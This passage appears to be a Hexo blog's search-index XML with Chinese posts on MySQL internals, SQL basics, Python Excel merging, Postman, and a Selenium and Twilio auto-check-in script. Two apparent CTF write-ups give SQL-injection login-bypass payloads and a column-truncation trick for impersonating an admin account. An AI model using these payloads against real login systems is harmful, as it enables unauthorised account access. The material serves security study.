ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。 参考链接：mysql information_schema介绍十分钟了结MySQL information_schema]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[滥用 MySQL LOCAL INFILE 读取客户端文件]]></title>
    <url>%2F2018%2F04%2F25%2F%E6%BB%A5%E7%94%A8%20MySQL%20LOCAL%20INFILE%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[LOAD DATA INFILEMySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。 1mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl; 如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。 你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。 两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。 如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。 123mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl -&gt; FIELDS TERMINATED BY &apos;:&apos; -&gt; LINES TERMINATED BY &apos;\r\n&apos;; LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。 如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下： 12mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; -&gt; INTO TABLE mytbl (b, c, a); 浅谈MySQL load data local infile细节 – 从源码层面mysql 的load data local infile命令如果在使用过程中出现提示： 1ERROR 1148 (42000): The used command is not allowed with this MySQL version 这种情况一般是由于MySQL限制了客户端导入本地文件的权限， 解决方案： MySQL远程导入数据LOAD DATA LOCAL INFILE …关于命令load data local infile 配置MySQL安全配置正餐一道CTF题目的学习 滥用 MySQL LOCAL INFILE 读取客户端文件: https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html]]></content>
      <categories>
        <category>Web安全</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo的Next主题实现二级categories]]></title>
    <url>%2F2018%2F04%2F25%2FHexo%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%AE%9E%E7%8E%B0%E4%BA%8C%E7%BA%A7categories%2F</url>
    <content type="text"><![CDATA[just like this 123categories: - 一级分类- 二级分类 注意一下-后面还有个空格]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDL、DML、DCL的区别和理解]]></title>
    <url>%2F2018%2F04%2F25%2FDDL%E3%80%81DML%E3%80%81DCL%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[DML DML（data manipulation language）数据操纵语言： 数据操作语言，SQL中处理数据等操作统称为数据操纵语言 123456789101112131.SELECT - retrieve data from the a database 查询 2.INSERT - insert data into a table添加 3.UPDATE - updates existing data within a table 更新 4.DELETE - deletes all records from a table, the space for the records remain 删除 5.CALL - call a PL/SQL or Java subprogram 6.EXPLAIN PLAN - explain access path to data 7.LOCK TABLE - control concurrency 锁，用于控制并发 1234SELECT 列名称 FROM 表名称UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)DELETE FROM 表名称 WHERE 列名称 = 值 DDL DDL（data definition language）数据库定义语言： 数据定义语言，用于定义和管理 SQL 数据库中的所有对象的语言 1234567891011121314151.CREATE - to create objects in the database 创建 2.ALTER - alters the structure of the database 修改 3.DROP - delete objects from the database 删除 4.TRUNCATE - remove all records from a table, including all spaces allocated for the records are removed TRUNCATE TABLE [Table Name]。 5.COMMENT - add comments to the data dictionary 注释 6.GRANT - gives user&apos;s access privileges to database 授权 7.REVOKE - withdraw access privileges given with the GRANT command 收回已经授予的权限 12345678910111213CREATE TABLE 表名称(列名称1 数据类型,列名称2 数据类型,列名称3 数据类型,....)ALTER TABLE table_nameALTER COLUMN column_name datatypeDROP TABLE 表名称DROP DATABASE 数据库名称 DCL DCL（Data Control Language）数据库控制语言： 是用来设置或更改数据库用户或角色权限的语句，包括（grant,deny,revoke等）语句。这个比较少用到。 12345671.COMMIT - save work done 提交 2.SAVEPOINT - identify a point in a transaction to which you can later roll back 保存点 3.ROLLBACK - restore database to original since the last COMMIT 回滚 4.SET TRANSACTION - Change transaction options like what rollback segment to use 设置当前事务的特性，它对后面的事务没有影响 ​]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（2）：MySQL长字符截断]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9AMySQL%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[介绍：转载来自MySQL 字符截断攻击 先创建一张表 12345CREATE table users(id int(11) not NULL primary key auto_increment,username char(8) not NULL,password char(10) not NULL); 正常插入 admin ; admin insert into users(username,password) values(&#39;admin&#39;,&#39;admin&#39;); 超出字符限制插入(用户名长度为8): insert into users(username,password) values(&#39;admin &#39;,&#39;admin&#39;); insert into users(username,password) values(&#39;admin 1&#39;,&#39;admin&#39;); 超过位数的用户名会被截断 ,所以 ,admin 1 与 admin共存于一张表 select username from users where username = &#39;admin&#39;; 发现两个用户都被select出来 如果管理员的登录界面是这样判断的 : $sql = &quot;select count(*) from users where username = &#39;admin&#39; and password=&#39;任意&#39; &quot;; 那我们只需要注册一个账号为admin 1,password = &quot;任意&quot;, 就可以用admin登录 题目：https://ringzer0team.com/challenges/171 随手试了一下二次注入，发现有点不像于是进行长度截断注册 12username=admin 1#password=1 登录 12username=adminpassword=1 ####]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web安全，SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（1）：注释]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E6%B3%A8%E9%87%8A%2F</url>
    <content type="text"><![CDATA[各个数据库的注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576OracleREM单行注释-- 单行注释/*多行注释*/ MS SQL Server-- 单行注释/*多行注释*/ MySQL#单行注释-- 单行注释（特别注意，-- 后有个空格！！！）/*多行注释*/ 总结：/*多行注释*/ 和-- 单行注释都差不多，MySQL要注意。非标准的#和REM最好还是不要用了为了兼容-- 后面最好都加空格MySQL注释的说明－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－‘--’作为注释起始标记一些其他SQL数据库采用“--”作为注释开始标志。MySQL服务器采用“#”作为注释起始字符。对于MySQL服务器，也能使用C风格的注释：/*该处为注释*/。请参见9.5节，“注释语法”。MySQL服务器3.23.3和更高版本支持“--”注释风格，但要求注释后面跟1空格（或控制字符，如新行）。之所以要求使用空格，是为了防止与自动生成SQL查询有关的问题，它采用了类似下面的代码，其中，自动为“!payment!”插入“payment”的值：UPDATE account SET credit=credit-!payment!考虑一下，如果“payment”的值为负数如“-1”时会出现什么情况：UPDATE account SET credit=credit--1在SQL中“credit--1”是合法的表达式，但是，如果“--1”被解释为注释开始，部分表达式将被舍弃。其结果是，表达式的意义与预期的意义完全不同。UPDATE account SET credit=credit该语句不会对值作任何更改！这表明，允许注释以“--”开始会产生严重后果。采用MySQL服务器3.23.3和更高版本中的这类注释方法，“credit--1”实际上很安全。另一个安全特性是，mysql命令行客户端将删除所有以“--”开头的行。仅当使用高于3.23.3的MySQL时，下述信息才有意义：如果有1个文本文件形式的SQL程序，该文件包含“--”注释，应按下述方式使用replace实用工具，将其转换为使用“#”字符的注释：shell&gt; replace &quot; --&quot; &quot; #&quot; &lt; text-file-with-funny-comments.sql \ | mysql db_name而不是通常的：shell&gt; mysql db_name &lt; text-file-with-funny-comments.sql你也可以编辑注释文件，将“--”注释更改为“#”注释：shell&gt; replace &quot; --&quot; &quot; #&quot; -- text-file-with-funny-comments.sql使用下述命令将其改回去：shell&gt; replace &quot; #&quot; &quot; --&quot; -- text-file-with-funny-comments.sql 题目：Most basic SQLi pattern.(point 1)12username: admin&apos;#password: 1 签到题，注释后面的password语句 解释： 如果后台的数据库语句是这样子的 1select * from user where username = '$username' and password = '$password' 输入之后，后面的password就被注释掉了，如果有admin的用户，就可以登录成功 1select * from user where username = 'admin'# and password = '1' ACL rulezzz the world.(point 2)随手测试 1username=admin&apos; 得到 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos;&apos; at line 4 随手闭合一下 1username=admin&apos; or 1# ###]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>转载,SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python合并Excel表格]]></title>
    <url>%2F2018%2F04%2F23%2FPython%E5%90%88%E5%B9%B6Excel%E8%A1%A8%E6%A0%BC%2F</url>
    <content type="text"><![CDATA[前言：因为有个同学问我有没有快速合并二十多个表格的方法，我说用Python，，， 然后，就有了下面的代码 #### 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/22 0:40# @Author : Lhaihai# @File : CombinedForm.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 合并文件夹的二十多个Excel"""import openpyxlimport openpyxl.cellfrom openpyxl.utils import get_column_letterimport osdef main(file_dir): for root, dirs, files in os.walk(file_dir): if(root != file_dir): continue print(root) #当前目录路径 print(dirs) #当前路径下所有子目录 print(files) #当前路径下所有非目录子文件 path = "xxxxxxxxxxx" wbmain = openpyxl.load_workbook(path + '数据导入模板.xlsx') sheetmain1 = wbmain['1.学生本人基本信息'] sheetmain2 = wbmain['2.学生家庭成员基本信息'] try: sheetmain3 = wbmain['3.学生本人干部任职信息'] except: print('Worksheet 3.学生本人干部任职信息 does not exist.') try: sheetmain4 = wbmain['4.论文'] # print(sheetmain4) except: print('Worksheet 4.论文 does not exist.') sheetmain5 = wbmain['5.评优'] try: sheetmain6 = wbmain['6.实习数据'] # print(sheetmain6) except: print('Worksheet 6.实习数据 does not exist.') sheetmain7 = wbmain['7.学生活动'] indexrow = [2,2,2,2,2,2,2] for file in files: if(file == '数据导入模板.xlsx'): continue print(path+file) wb = openpyxl.load_workbook(path+file) sheet1 = wb['1.学生本人基本信息'] print(sheet1.max_row) for i in range(2,int(sheet1.max_row)+1): if(not sheet1['A'+str(i)].value): continue for j in range(1,20): letter = get_column_letter(j) sheetmain1[letter+str(indexrow[0])] = sheet1[letter+str(i)].value print(sheetmain1[letter+str(indexrow[0])].value) indexrow[0]+=1 # sheet2 = wb['2.学生家庭成员基本信息'] # for i in range(2,int(sheet2.max_row)+1): # for j in range(1,14): # letter = get_column_letter(j) # sheetmain2[letter+str(indexrow[1])] = sheet2[letter+str(i)].value # print(sheetmain2[letter+str(indexrow[1])].value) # indexrow[1]+=1 try: sheet3 = wb['3.学生本人干部任职信息'] for i in range(2, int(sheet3.max_row) + 1): if (not sheet3['A' + str(i)].value): continue for j in range(1, 10): letter = get_column_letter(j) sheetmain3[letter + str(indexrow[2])] = sheet3[letter + str(i)].value print(sheetmain3[letter + str(indexrow[2])].value) indexrow[2] += 1 except: print(file+'Worksheet 3.学生本人干部任职信息 does not exist') try: sheet4 = wb['4.论文'] for i in range(2, int(sheet4.max_row) + 1): if (not sheet4['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain4[letter + str(indexrow[3])] = sheet4[letter + str(i)].value print(sheetmain4[letter + str(indexrow[3])].value) indexrow[3] += 1 except: print('Worksheet 4.论文 does not exist.') try: sheet5 = wb['5.评优'] for i in range(2, int(sheet5.max_row) + 1): if (not sheet5['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain5[letter + str(indexrow[4])] = sheet5[letter + str(i)].value print(sheetmain5[letter + str(indexrow[4])].value) indexrow[4] += 1 except: print(file+'Worksheet 5.评优 does not exist.') try: sheet6 = wb['6.实习数据'] for i in range(2, int(sheet6.max_row) + 1): if (not sheet6['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain6[letter + str(indexrow[5])] = sheet6[letter + str(i)].value print(sheetmain6[letter + str(indexrow[5])].value) indexrow[5] += 1 except: print('Worksheet 6.实习数据 does not exist.') sheet7 = wb['7.学生活动'] for i in range(2, int(sheet7.max_row) + 1): if (not sheet7['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain7[letter + str(indexrow[6])] = sheet7[letter + str(i)].value print(sheetmain7[letter + str(indexrow[6])].value) indexrow[6]+=1 wbmain.save(path+'example2.xlsx')if __name__ == '__main__': path= r'xxxxxx' main(path)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Postman使用]]></title>
    <url>%2F2018%2F04%2F23%2FPostman%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[介绍： 模拟各种HTTP requests 从常用的 GET、POST 到 RESTful 的 PUT 、 DELETE …等等。 甚至还可以发送文件、送出额外的 header。 Collection 功能（测试集合） Collection 是 requests的集合，在做完一個测试的時候， 你可以把這次的 request 存到特定的 Collection 里面，如此一來，下次要做同样的测试时，就不需要重新输入。而且一个collection可以包含多条request，如果我们把一个request当成一个test case，那collection就可以看成是一个test suite。通过collection的归类，我们可以良好的分类测试软件所提供的API.而且 Collection 还可以 Import 或是 Share 出來，让团队里面的所有人共享你建立起來的 Collection。 人性化的Response整理 一般在用其他工具來测试的時候，response的内容通常都是纯文字的 raw， 但如果是 JSON ，就是塞成一整行的 JSON。这会造成阅读的障碍 ，而 Postman 可以针对response内容的格式自动美化。 JSON、 XML 或是 HTML 都會整理成我们可以阅读的格式 内置测试脚本语言 Postman支持编写测试脚本，可以快速的检查request的结果，并返回测试结果 设定变量与环境 Postman 可以自由 设定变量与Environment，一般我们在编辑request，校验response的时候，总会需要重复输入某些字符，比如url，postman允许我们设定变量来保存这些值。并且把变量保存在不同的环境中。比如，我們可能会有多种环境， development 、 staging 或 local， 而这几种环境中的 request URL 也各不相同，但我们可以在不同的环境中设定同样的变量，只是变量的值不一样，这样我们就不用修改我们的测试脚本，而测试不同的环境。 下载地址：因为2018年初Chrome禁止了Postman，但我刚才使用的时候是可以再Chrome浏览器使用的。然而还是有个提示建议用本地客户端。 所以放出官网下载链接 https://www.getpostman.com/postman 可以使用google账号直接登录 使用： 官方文档https://www.getpostman.com/docs/v6/]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
      <tags>
        <tag>web,tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3实现hetianlab自动签到并且发短信到手机]]></title>
    <url>%2F2018%2F04%2F17%2Fhetianlab%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E5%B9%B6%E4%B8%94%E5%8F%91%E7%9F%AD%E4%BF%A1%E5%88%B0%E6%89%8B%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[首发合天，禁止转载0x00 前言​ 这几天学了学python爬虫，就想用python实现一下自动签到领取积分，毕竟我比较懒，能不动手就让代码去做吧，☺。 0x01 安装环境python 需要用到的库12pip install selenium #模拟浏览器行为的库pip install twilio #发送短信 安装ChromeDriverChromeDriver是Chrome浏览器的自动化测试工具 1、先查看Chrome浏览器的版本 点击 Chrome 的菜单，帮助-&gt;关于 Chrome，即可查看 Chrome 的版本号 这里我的版本号是65.0 2、下载ChromeDriver 官方下载链接： https://sites.google.com/a/chromium.org/chromedriver/downloads 这里我就下载 ChromeDriver 2.37 3、配置环境变量 Windows下，直接把ChromeDriver .exe 放在Python的 Scripts目录下 Linux和Mac也是一样把文件移动到属于环境变量的目录里或者将可执行文件配置到环境变量。 例如下面移动文件到 /usr/bin 目录，首先进入其所在路径，然后将其移动到 /usr/bin： 1sudo mv chromedriver /usr/bin 4、测试一下哈 在命令行输入 chromedriver ，如果有类似输出就说明chromedriver 的环境变量配置好了 然后再写代码测试一下 12from selenium import webdriverbrowser = webdriver.Chrome() 运行，会弹出Chrome浏览器，就可以开始写登录代码了。 0x02 登录hetianlabselenium是什么官方的话：selenium一个Web应用程序测试的工具，而且Selenium测试直接运行在浏览器中，就像真正的用户在操作一样 简单的说，就是我们可以用selenium来控制浏览器然后完成一系列操作，比如打开某个网页，点击超链接、按钮，在文本框输入字符，获取网页的内容，模拟鼠标操作（右键，双击） Selenium 支持非常多的浏览器，如 Chrome、Firefox、Edge等，最新版本的Selenium已经不支持无界面浏览器PhantomJS，但是Chrome和Firefox已经支持无界面。 我们可以用下面的方式初始化一个浏览器对象 1234567from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.PhantomJS()browser = webdriver.Safari() 设置Chrome浏览器无界面： 1234567from selenium import webdriverfrom selenium.webdriver.chrome.options import Options #导入Optionschrome_options = Options()chrome_options.add_argument('--headless') #无界面模式chrome_options.add_argument('--disable-gpu') #Windows平台需要加上browser = webdriver.Chrome(chrome_options=chrome_options) #把无界面设置导入 想要了解更多，可以查看官方文档：https://developers.google.cn/web/updates/2017/04/headless-chrome 打开一个网页Selenium提供了get()方法来访问网页 123456from selenium import webdriverbrowser = webdriver.Chrome()browser.get('https://www.baidu.com') #打开百度print(browser.page_source)browser.close() selenium怎么获取网页信息获取节点selenium获取节点（节点可以理解是网页的按钮，输入框等，学过HTML的同学知道其实它就是一个标签或者标签里面的内容、属性）的方法很多，下面是获取单个节点的方法，返回的是WebElement 类型 12345678find_element_by_idfind_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector 想获取多个节点的话，就是element后面加上s 例如：find_elements_by_id 查找多个节点函数返回的结果是一个列表，列表的每个节点是WebElement 类型 节点交互输入文字用 send_keys() 方法，清空文字用 clear() 方法，另外按钮点击用 click() 方法。例如： 12phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名 获取节点信息WebElement 类型有相关的方法和属性来直接提取节点信息，如属性、文本等等 123456input = browser.find_element_by_by_id('userEmail')print(input.get_attribute('class') #获取class的名字print(input.id) #获取idprint(input.location) #location 可以获取该节点在页面中的相对位置 print(input.tag_name) #tag_name 可以获取标签名称print(input.size) #size 可以获取节点的大小 知识点介绍好了，开始实战，打开我们要签到的首页，F12 -&gt;点一下左边的小箭头-&gt;再点输入手机的文本框-&gt;就会显示出文本框的信息来。查看发现它的id是userEmail，就可以通过id来获取这个节点。 密码框和登录按钮也是如此，类似操作拿到密码框的id是 passwordIn，登录按钮的id是registButIn。 于是我们初步的代码已经出来了。 version 1.0这是第一个版本， 12345678910111213141516from selenium import webdriverimport timeUsername = 'xxxxxxxxx' #登录的手机号码Password = 'xxxxxxxxxx' #密码loginUrl = 'http://www.xxxxxx.com/loginLab.do' #xxxxxx登录网址browser = webdriver.Chrome()browser.maximize_window() #浏览器最大化browser.get(loginUrl) #Chrome浏览器打开登录页面phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名password = browser.find_element_by_id('passwordIn') #通过id捕获到密码输入框password.send_keys(Password) #在密码框输入密码siginbutton = browser.find_element_by_id('registButIn') #捕获到登录按钮 siginbutton.click() #点击登录按钮time.sleep(3) #暂停3sbrowser.close() #关闭浏览器 运行，试了几次竟然都成功登录了 :-( 我之前测试的时候，老是没有登录成功，原因是 登录按钮没有获取到，就算暂停了程序(time.sleep())等一等还是有这个问题。所以我就写了个函数来检查登录按钮是否获取成功 1234567891011121314151617def isFindElement(element): # print('check:') # print(element) if element: #如果捕获到元素，就返回true，否则返回false return True else: return False def SignIn() #略略略 #----- siginbutton = browser.find_element_by_id('registButIn') while(not isFindElement(siginbutton)): #循环判断登录按钮是否获取成功，成功就退出 time.sleep(0.5) print('signin-false') siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() 之前测试的时候，check起码打印两次 :-( ， 但是想到这个方法的估计也就像我一样是个不怎么了解selenium的新手 后来了解到 selenium的等待，赶紧优化一下 version 2.0介绍两个新概念 selenium 的隐性等待和显性等待 隐性等待隐形等待是设置了一个最长等待时间，如果在规定时间内网页加载完成，则执行下一步，否则一直等到时间截止，然后执行下一步。 1implicitly_wait(10) #等待10s 温馨提示：隐性等待在整个driver的周期都起作用，所以只要设置一次即可显性等待WebDriverWait，配合该类的until()和until_not()方法，就可以根据判断条件而进行灵活地等待了。 它主要的意思就是：程序每隔xx秒看一眼，如果条件成立了，则执行下一步，否则继续等待，直到超过设置的最长时间，然后抛出TimeoutException。 代码具体什么意思可以去看一下手册，这里我们只要会调用就好了。 123456789101112131415from selenium.webdriver.support.wait import WebDriverWait #导入了新的库from selenium.webdriver.support import expected_conditions as EC #导入了新的库from selenium.webdriver.common.by import By #导入了新的库 def SignIn() #省略十万行代码 locator = (By.ID, 'registButIn') #通过id发现的登录按钮 try: #等待30s，默认0.5s检查一次是否捕获到登录按钮 WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") 温馨提示：最长等待时间取决于隐性等待和显性等待的最大值。上面例子为30s，如果隐性等待时间大于显性等待时间，那么最长等待时间就是隐性等待时间 顺便包装为函数方便调用，添加上获取合氏币的代码，前面为了方便测试就没有设置为无界面模式，现在可以设置为无界面模式了version 2.0 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/17 12:55# @Author : Lhaihai# @File : # @Software: PyCharm""" Description : 自动登录，签到一下，并且拿到自己当前积分有多少，最后发送短信给手机"""from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By import timechrome_options = Options()chrome_options.add_argument('--headless')chrome_options.add_argument('--disable-gpu')def SignIn(Username,Password): loginUrl='http://www.xxxxxxx.com/loginLab.do' browser = webdriver.Chrome(chrome_options=chrome_options) #设置为无界面模式 browser.maximize_window() browser.implicitly_wait(10) #隐性等待10s browser.get(loginUrl) phonenumber = browser.find_element_by_id('userEmail') phonenumber.send_keys(Username) password = browser.find_element_by_id('passwordIn') password.send_keys(Password) locator = (By.ID, 'registButIn') try: WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) #显性等待30s siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") time.sleep(3) #signImg捕获用户头像，没错就是头像，其实把鼠标放到头像上就会显示我的主页，selenium也有模拟鼠标操作的，那就是ActionChains，这里简单起见就直接使用.click()了 signImg = browser.find_element_by_class_name('siLg-img') signImg.click() #点击 myindex = browser.find_element_by_link_text('我的主页') myindex.click() #点击我的主页 heshibi = browser.find_elements_by_class_name('allNum') #获得登录次数和积分数量 Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].text print(Msg) browser.close() if __name__ == '__main__': SignIn('username','password') #填写你的用户名和密码 0x03 发送短信​ 这时候我们已经可以成功登录并且拿到自己账号积分的数量。接下来我们进行最后一步，发送短信到自己手机上。 1、注册Twilio账号访问http://twilio.com/（需要自备梯子）填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。 现在，就可以用twilio模块向这个电话号码发送短信了。 2、获取一个Twilio电话号码：我在Dashboard找了好久没发现Phone的选项，后来翻了翻官方教程https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/，然后点里面的链接打开 :-( 。 其实你可以用右上角的UPGRADE搜索框搜索，或者直接打开这个网址 https://www.twilio.com/console/phone-numbers/getting-started 挑一个地区和号码，确定。恭喜你，获得一个免费的电话号码了。 3、要验证接收短信的手机号码，要不然就会出现下面的报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 在Verified 验证手机号码 可以发送短信验证码或者接受电话获得验证码 4、正式发送短信从官方文档 https://www.twilio.com/docs/libraries/python 拿到下面代码 123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", #接收短信的手机 from_="+15017250604", #自己twilio的号码 body="Hello from Python!") #短信的内容print(message.sid) 只需要把 auth_tocken 和from_换成自己的，再修改一下to和body auth_tocken : 打开Dashboard，加密的就是你的auth_tocken message 的from_ 填上你的twilio手机号码，虽然你选择号码的时候看起来是这样子：+1(855) 912-6770 (这个号码是我重新去twilio买电话号码那随机拿的一个，并不是我的:） )但是最后你会获得一个号码：类似+15017250604 ， 运行一下，就可以收到短信了，短信的号码是会换了，玩多了你就发现自己手机一大片都是twilio的短信 最后封装一下函数，类似下方， 12345678910111213141516from twilio.rest import Clientdef sendMessage(toPhoneNumber,Msg): # Your Account SID from twilio.com/console account_sid = "AC9810ae2342f0014cd05e338bce9be8cb" # Your Auth Token from twilio.com/console auth_token = "your_auth_token" client = Client(account_sid, auth_token) message = client.messages.create( to='+86'+toPhoneNumber, #接收短信的手机 from_="+15017250604", #自己twilio的号码 body=Msg) #短信的内容 print(message.sid) 我保存为twilioToMyPhone.py，放到python.exe 当前目录下 以后想发送短信就直接调用： 12import twilioToMyPhonetwilioToMyPhone.sendMessage('phonenumber',Msg) 5、在version 2.0 加上发送短信的代码在开头导入库 1import twilioToMyPhone 在browser.close() 之前，Msg = &#39;&#39;签到成功......&#39;之后加上发送短信的一句代码 123Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].texttwilioToMyPhone.sendMessage('phonenumber',Msg)browser.close() 差不多大功告成了，就算可以一键登录，不用手动打开浏览器，我还是想跟懒一点 :） 最后一步，设置每天自动启动py tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在import twilio库的时候会失败， 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3：github项目 https://github.com/twilio/twilio-python/ 0x04 设置每天自动启动python.bat 运行python问题来了，想要运行python代码，总不能启动pycharm然后点击运行吧 ，所以使用DOS命令来运行python代码 而.bat 是 windows的批处理文件，可以双击.bat文件来运行我们的python代码 具体什么意思么，.py文件不能像exe一样双击运行，但是.bat文件可以，这是为了方便我们下一步的任务启动器 类似下图， 这里有个坑，当你原原本本按照上图打好了每一个字符，双击.bat ，却发现没有成功运行（收到短信） 然后复制python F:\CodeDevelopment\PythonDevelopment\hetianLabSignin.py 到DOS，发现有个方框在 F:\前面，去掉方框，再从DOS复制这条代码到.bat文件，就可以运行了。或者直接先在DOS敲好这句代码，然后复制到.bat。 当然，顺便运行看看能不能正常启动，类似下图就是成功了，但DOS会跳出一些INFO，目前还不知道为什么 任务计划程序当当当，最最后一步，设置自动启动 不同操作系统都有自己的任务计划程序 Windows ：任务计划程序， Linux： Cron Mac ： Launchd 以Windows 10 为例子： 1、打开任务计划程序，直接搜索就好了，win+s弹出搜索框(开着小娜的话电脑CPU利用率一直挺高，关了就好很多了)，然后输入任务计划程序 2、点击右边的创建任务 3、名字自己随便取吧，触发器-&gt;新建-&gt; 设置每天某个时候启动， 但是如果我那个时候电脑没有开启呢？可以在设置勾上 ‘如果过了计划开始时间，立即启动任务’ 4、最重要的操作来了，新建操作-&gt;浏览选上测试好的bat 5、乖巧等待它自动运行 0x05 后记或许有大佬想问了，为啥不用request，而这么麻烦的用selenium。 我是学习了selenium后，想要练练手，仅此而用。 简单尝试了下request 123456789import requestsdatas=&#123; 